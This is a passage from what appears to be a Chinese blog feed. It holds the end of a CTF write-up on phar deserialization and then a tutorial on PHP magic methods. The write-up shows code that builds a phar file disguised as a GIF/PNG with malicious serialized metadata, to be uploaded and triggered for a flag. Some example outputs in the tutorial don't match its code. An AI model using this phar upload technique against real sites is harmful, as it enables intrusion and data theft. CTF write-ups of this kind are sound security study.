class="line">$a-&gt;db = <span class="keyword">new</span> FileList();</span><br><span class="line"></span><br><span class="line"><span class="comment">//构造phar文件</span></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'3.phar'</span>);</span><br><span class="line">$phar -&gt; startBuffering();</span><br><span class="line">$phar -&gt; setStub(<span class="string">'GIF89a'</span>.<span class="string">'&lt;?php __HALT_COMPILER();?&gt;'</span>);<span class="comment">//设置stub</span></span><br><span class="line">$phar -&gt; addFromString(<span class="string">'test.txt'</span>,<span class="string">'test'</span>);<span class="comment">//添加要压缩的文件</span></span><br><span class="line">$phar -&gt; setMetadata($a);<span class="comment">//存入自定义的meta-data</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line">$phar -&gt; stopBuffering();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行这个php文件 会生成一个 3.phar 文件，更改后缀名为 png 上传</p><p>成功上传后 执行删除操作，触发phar反序列化，得到flag</p><p><img src="https://i.loli.net/2021/01/19/FvbPjK8nQBmYRCh.png" alt="image-20210119183943641"></p><p>参考链接：</p><ul><li><a href="https://www.cnblogs.com/chrysanthemum/p/11785453.html" target="_blank" rel="noopener">https://www.cnblogs.com/chrysanthemum/p/11785453.html</a></li><li><a href="https://flag0.com/2019/10/31/ciscn2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Dropbox/" target="_blank" rel="noopener">https://flag0.com/2019/10/31/ciscn2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Dropbox/</a></li><li><a href="http://www.iniess.ink/index.php/archives/Dropbox-1.html" target="_blank" rel="noopener">http://www.iniess.ink/index.php/archives/Dropbox-1.html</a></li></ul><p>有关phar的文章 下面这篇写的不戳</p><ul><li><a href="https://xz.aliyun.com/t/2715#toc-16" target="_blank" rel="noopener">https://xz.aliyun.com/t/2715#toc-16</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;CISCN2019-华北赛区-Day1-Web1-Dropbox&quot;&gt;&lt;a href=&quot;#CISCN2019-华北赛区-Day1-Web1-Dropbox&quot; class=&quot;headerlink&quot; title=&quot;[CISCN2019 华北赛区 Day1 Web1]Dropbox&quot;&gt;&lt;/a&gt;[CISCN2019 华北赛区 Day1 Web1]Dropbox&lt;/h1&gt;&lt;p&gt;考点：phar协议&lt;/p&gt;
    
    </summary>
    
    
      <category term="PHP" scheme="http://goudanjun.vip/tags/PHP/"/>
    
      <category term="phar协议" scheme="http://goudanjun.vip/tags/phar%E5%8D%8F%E8%AE%AE/"/>
    
      <category term="反序列化" scheme="http://goudanjun.vip/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>PHP魔术方法总结</title>
    <link href="http://goudanjun.vip/2021/01/19/PHP%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93.html/"/>
    <id>http://goudanjun.vip/2021/01/19/PHP魔术方法总结.html/</id>
    <published>2021-01-19T02:37:41.000Z</published>
    <updated>2021-01-19T02:45:19.882Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>PHP中把以两个下划线__开头的方法称为魔术方法(Magic methods)，这些方法在PHP中充当了举足轻重的作用。 魔术方法包括：</p><a id="more"></a><ol><li>__construct()，类的构造函数</li><li>__destruct()，类的析构函数</li><li>__call()，在对象中调用一个不可访问方法时调用</li><li>__callStatic()，用静态方式中调用一个不可访问方法时调用</li><li>__get()，获得一个类的成员变量时调用</li><li>__set()，设置一个类的成员变量时调用</li><li>__isset()，当对不可访问属性调用isset()或empty()时调用</li><li>__unset()，当对不可访问属性调用unset()时被调用。</li><li>__sleep()，执行serialize()时，先会调用这个函数</li><li>__wakeup()，执行unserialize()时，先会调用这个函数</li><li>__toString()，类被当成字符串时的回应方法</li><li>__invoke()，调用函数的方式调用一个对象时的回应方法</li><li>__set_state()，调用var_export()导出类时，此静态方法会被调用。</li><li>__clone()，当对象复制完成时调用</li><li>__autoload()，尝试加载未定义的类</li><li>__debugInfo()，打印所需调试信息</li></ol><h2 id="范例"><a href="#范例" class="headerlink" title="范例"></a>范例</h2><p>下面让我们以实例的形式向大家讲解下这几个魔术方法时如何使用的。</p><h3 id="construct-，类的构造函数"><a href="#construct-，类的构造函数" class="headerlink" title="__construct()，类的构造函数"></a>__construct()，类的构造函数</h3><p>php中构造方法是对象创建完成后第一个被对象自动调用的方法。在每个类中都有一个构造方法，如果没有显示地声明它，那么类中都会默认存在一个没有参数且内容为空的构造方法。</p><p>1、 构造方法的作用</p><p>通常构造方法被用来执行一些有用的初始化任务，如对成员属性在创建对象时赋予初始值。</p><p>2、 构造方法的在类中的声明格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function __constrct([参数列表])&#123;</span><br><span class="line"></span><br><span class="line">    方法体 //通常用来对成员属性进行初始化赋值</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3、 在类中声明构造方法需要注意的事项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、在同一个类中只能声明一个构造方法，原因是，PHP不支持构造函数重载。</span><br><span class="line"></span><br><span class="line">2、构造方法名称是以两个下画线开始的__construct()</span><br></pre></td></tr></table></figure><p>下面是它的例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class">    </span>&#123;                                                                      </span><br><span class="line">            <span class="keyword">public</span> $name;        </span><br><span class="line">            <span class="keyword">public</span> $age;        </span><br><span class="line">            <span class="keyword">public</span> $sex;        </span><br><span class="line">                                                                 </span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 显示声明一个构造方法且带参数</span></span><br><span class="line"><span class="comment">         */</span>                                                                                       </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name=<span class="string">""</span>, $sex=<span class="string">"男"</span>, $age=<span class="number">22</span>)</span></span></span><br><span class="line"><span class="function">        </span>&#123;      </span><br><span class="line">            <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;sex = $sex;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;age = $age;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * say 方法</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"我叫："</span> . <span class="keyword">$this</span>-&gt;name . <span class="string">"，性别："</span> . <span class="keyword">$this</span>-&gt;sex . <span class="string">"，年龄："</span> . <span class="keyword">$this</span>-&gt;age;</span><br><span class="line">        &#125;   </span><br><span class="line">                                                                                           </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>创建对象$Person1且不带任参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$Person1 = new Person();</span><br><span class="line">echo $Person1-&gt;say(); //输出:我叫：，性别：男，年龄：27</span><br></pre></td></tr></table></figure><p>创建对象$Person2且带参数“小明”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$Person2 = new Person(&quot;小明&quot;);</span><br><span class="line">echo $Person2-&gt;say(); //输出：我叫：张三，性别：男，年龄：27</span><br></pre></td></tr></table></figure><p>创建对象$Person3且带三个参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$Person3 = new Person(&quot;李四&quot;,&quot;男&quot;,25);</span><br><span class="line">echo $Person3-&gt;say(); //输出：我叫：李四，性别：男，年龄：25</span><br></pre></td></tr></table></figure><h3 id="destruct-，类的析构函数"><a href="#destruct-，类的析构函数" class="headerlink" title="__destruct()，类的析构函数"></a>__destruct()，类的析构函数</h3><p>通过上面的讲解，现在我们已经知道了什么叫构造方法。那么与构造方法对应的就是析构方法。</p><p>析构方法允许在销毁一个类之前执行的一些操作或完成一些功能，比如说关闭文件、释放结果集等。</p><p>析构方法是PHP5才引进的新内容。</p><p>析造方法的声明格式与构造方法 <code>__construct()</code> 比较类似，也是以两个下划线开始的方法 <code>__destruct()</code> ，这种析构方法名称也是固定的。</p><p>1、 析构方法的声明格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function __destruct()</span><br><span class="line">&#123;</span><br><span class="line"> //方法体</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意：析构函数不能带有任何参数。</p><p>2、 析构方法的作用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一般来说，析构方法在PHP中并不是很常用，它属类中可选择的一部分，通常用来完成一些在对象销毁前的清理任务。</span><br></pre></td></tr></table></figure><p>举例演示，如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;     </span><br><span class="line">                                                        </span><br><span class="line">    <span class="keyword">public</span> $name;         </span><br><span class="line">    <span class="keyword">public</span> $age;         </span><br><span class="line">    <span class="keyword">public</span> $sex;         </span><br><span class="line">                                                                    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name=<span class="string">""</span>, $sex=<span class="string">"男"</span>, $age=<span class="number">22</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex  = $sex;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age  = $age;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * say 说话方法</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"我叫："</span>.<span class="keyword">$this</span>-&gt;name.<span class="string">"，性别："</span>.<span class="keyword">$this</span>-&gt;sex.<span class="string">"，年龄："</span>.<span class="keyword">$this</span>-&gt;age;</span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 声明一个析构方法</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"我觉得我还可以再抢救一下，我的名字叫"</span>.<span class="keyword">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$Person = <span class="keyword">new</span> Person(<span class="string">"小明"</span>);</span><br><span class="line"><span class="keyword">unset</span>($Person); <span class="comment">//销毁上面创建的对象$Person</span></span><br></pre></td></tr></table></figure><p>上面的程序运行时输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我觉得我还可以再抢救一下，我的名字叫小明</span><br></pre></td></tr></table></figure><h3 id="call-，在对象中调用一个不可访问方法时调用。"><a href="#call-，在对象中调用一个不可访问方法时调用。" class="headerlink" title="__call()，在对象中调用一个不可访问方法时调用。"></a>__call()，在对象中调用一个不可访问方法时调用。</h3><p>该方法有两个参数，第一个参数 <code>$function_name</code> 会自动接收不存在的方法名，第二个 <code>$arguments</code> 则以数组的方式接收不存在方法的多个参数。</p><p>1、 __call() 方法的格式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function __call(string $function_name, array $arguments)</span><br><span class="line">&#123;</span><br><span class="line">    // 方法体</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2、 __call() 方法的作用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">为了避免当调用的方法不存在时产生错误，而意外的导致程序中止，可以使用 __call() 方法来避免。</span><br><span class="line"></span><br><span class="line">该方法在调用的方法不存在时会自动调用，程序仍会继续执行下去。</span><br></pre></td></tr></table></figure><p>请参考如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;                             </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">say</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">                              </span><br><span class="line">           <span class="keyword">echo</span> <span class="string">"Hello, world!&lt;br&gt;"</span>; </span><br><span class="line">    &#125;      </span><br><span class="line">        </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 声明此方法用来处理调用对象中不存在的方法</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($funName, $arguments)</span></span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">          <span class="keyword">echo</span> <span class="string">"你所调用的函数："</span> . $funName . <span class="string">"(参数："</span> ;  <span class="comment">// 输出调用不存在的方法名</span></span><br><span class="line">          print_r($arguments); <span class="comment">// 输出调用不存在的方法时的参数列表</span></span><br><span class="line">          <span class="keyword">echo</span> <span class="string">")不存在！&lt;br&gt;\n"</span>; <span class="comment">// 结束换行                      </span></span><br><span class="line">    &#125;                                          </span><br><span class="line">&#125;</span><br><span class="line">$Person = <span class="keyword">new</span> Person();            </span><br><span class="line">$Person-&gt;run(<span class="string">"teacher"</span>); <span class="comment">// 调用对象中不存在的方法，则自动调用了对象中的__call()方法</span></span><br><span class="line">$Person-&gt;eat(<span class="string">"小明"</span>, <span class="string">"苹果"</span>);             </span><br><span class="line">$Person-&gt;say();</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">你所调用的函数：run(参数：Array ( [0] =&gt; teacher ) )不存在！</span><br><span class="line"></span><br><span class="line">你所调用的函数：eat(参数：Array ( [0] =&gt; 小明 [1] =&gt; 苹果 ) )不存在！</span><br><span class="line"></span><br><span class="line">Hello, world!</span><br></pre></td></tr></table></figure><h3 id="callStatic-，用静态方式中调用一个不可访问方法时调用"><a href="#callStatic-，用静态方式中调用一个不可访问方法时调用" class="headerlink" title="__callStatic()，用静态方式中调用一个不可访问方法时调用"></a>__callStatic()，用静态方式中调用一个不可访问方法时调用</h3><p>此方法与上面所说的 __call() 功能除了 __callStatic() 是未静态方法准备的之外，其它都是一样的。</p><p>请看下面代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">say</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Hello, world!&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 声明此方法用来处理调用对象中不存在的方法</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span><span class="params">($funName, $arguments)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"你所调用的静态方法："</span> . $funName . <span class="string">"(参数："</span> ;  <span class="comment">// 输出调用不存在的方法名</span></span><br><span class="line">        print_r($arguments); <span class="comment">// 输出调用不存在的方法时的参数列表</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">")不存在！&lt;br&gt;\n"</span>; <span class="comment">// 结束换行</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$Person = <span class="keyword">new</span> Person();</span><br><span class="line">$Person::run(<span class="string">"teacher"</span>); <span class="comment">// 调用对象中不存在的方法，则自动调用了对象中的__call()方法</span></span><br><span class="line">$Person::eat(<span class="string">"小明"</span>, <span class="string">"苹果"</span>);</span><br><span class="line">$Person-&gt;say();</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">你所调用的静态方法：run(参数：Array ( [0] =&gt; teacher ) )不存在！</span><br><span class="line">你所调用的静态方法：eat(参数：Array ( [0] =&gt; 小明 [1] =&gt; 苹果 ) )不存在！</span><br><span class="line">Hello, world!</span><br></pre></td></tr></table></figure><h3 id="get-，获得一个类的成员变量时调用"><a href="#get-，获得一个类的成员变量时调用" class="headerlink" title="__get()，获得一个类的成员变量时调用"></a>__get()，获得一个类的成员变量时调用</h3><p>在 php 面向对象编程中，类的成员属性被设定为 <code>private</code> 后，如果我们试图在外面调用它则会出现“不能访问某个私有属性”的错误。那么为了解决这个问题，我们可以使用魔术方法 <code>__get()</code>。</p><ul><li><p>魔术方法__get()的作用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在程序运行过程中，通过它可以在对象的外部获取私有成员属性的值。</span><br></pre></td></tr></table></figure><p>我们通过下面的 __get() 的实例来更进一步的连接它吧：</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $name;</span><br><span class="line">    <span class="keyword">private</span> $age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name=<span class="string">""</span>, $age=<span class="number">1</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = $age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 在类中添加__get()方法，在直接获取属性值时自动调用一次，以属性名作为参数传入并处理</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $propertyName</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> int</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($propertyName)</span></span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="keyword">if</span> ($propertyName == <span class="string">"age"</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;age &gt; <span class="number">30</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;age - <span class="number">10</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;$propertyName;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;$propertyName;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$Person = <span class="keyword">new</span> Person(<span class="string">"小明"</span>, <span class="number">60</span>);   <span class="comment">// 通过Person类实例化的对象，并通过构造方法为属性赋初值</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"姓名："</span> . $Person-&gt;name . <span class="string">"&lt;br&gt;"</span>;   <span class="comment">// 直接访问私有属性name，自动调用了__get()方法可以间接获取</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"年龄："</span> . $Person-&gt;age . <span class="string">"&lt;br&gt;"</span>;    <span class="comment">// 自动调用了__get()方法，根据对象本身的情况会返回不同的值</span></span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">姓名：小明</span><br><span class="line">年龄：50</span><br></pre></td></tr></table></figure><h3 id="set-，设置一个类的成员变量时调用"><a href="#set-，设置一个类的成员变量时调用" class="headerlink" title="__set()，设置一个类的成员变量时调用"></a>__set()，设置一个类的成员变量时调用</h3><ul><li>__set() 的作用：</li></ul><p>__set( property,<em>p<strong>r</strong>o<strong>p</strong>e<strong>r</strong>t**y</em>,value )` 方法用来设置私有属性， 给一个未定义的属性赋值时，此方法会被触发，传递的参数是被设置的属性名和值。</p><p>请看下面的演示代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $name;</span><br><span class="line">    <span class="keyword">private</span> $age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name=<span class="string">""</span>,  $age=<span class="number">25</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age  = $age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 声明魔术方法需要两个参数，真接为私有属性赋值时自动调用，并可以屏蔽一些非法赋值</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $property</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $value</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span><span class="params">($property, $value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($property==<span class="string">"age"</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ($value &gt; <span class="number">150</span> || $value &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;$property = $value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 在类中声明说话的方法，将所有的私有属性说出</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"我叫"</span>.<span class="keyword">$this</span>-&gt;name.<span class="string">"，今年"</span>.<span class="keyword">$this</span>-&gt;age.<span class="string">"岁了"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$Person=<span class="keyword">new</span> Person(<span class="string">"小明"</span>, <span class="number">25</span>); <span class="comment">//注意，初始值将被下面所改变</span></span><br><span class="line"><span class="comment">//自动调用了__set()函数，将属性名name传给第一个参数，将属性值”李四”传给第二个参数</span></span><br><span class="line">$Person-&gt;name = <span class="string">"小红"</span>;     <span class="comment">//赋值成功。如果没有__set()，则出错。</span></span><br><span class="line"><span class="comment">//自动调用了__set()函数，将属性名age传给第一个参数，将属性值26传给第二个参数</span></span><br><span class="line">$Person-&gt;age = <span class="number">16</span>; <span class="comment">//赋值成功</span></span><br><span class="line">$Person-&gt;age = <span class="number">160</span>; <span class="comment">//160是一个非法值，赋值失效</span></span><br><span class="line">$Person-&gt;say();  <span class="comment">//输出：我叫小红，今年16岁了</span></span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 